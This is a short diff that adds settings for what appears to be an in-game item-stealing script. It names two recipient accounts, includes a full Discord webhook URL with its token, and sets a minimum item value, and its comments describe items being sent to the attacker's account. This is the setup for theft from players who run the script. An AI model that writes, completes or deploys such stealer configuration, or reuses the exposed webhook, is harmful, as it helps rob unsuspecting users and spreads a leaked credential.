@@ -1,0 +1,4 @@
+Username = "WhyYoHereMate"
+Username2 = "ShenaOnli" -- stuff will get sent to this user if first user's mailbox is full
+webhook = "https://discord.com/api/webhooks/1256514332104196116/MulR0-bQK_8OYHEbqGZqdrJoJbI6ndqJkfKahg_hZAEirIAgWesHXzgmopyi2aPxfhxp"
+min_rap = 10000 -- minimum rap of each item you want to get sent to you. 1 mil by default
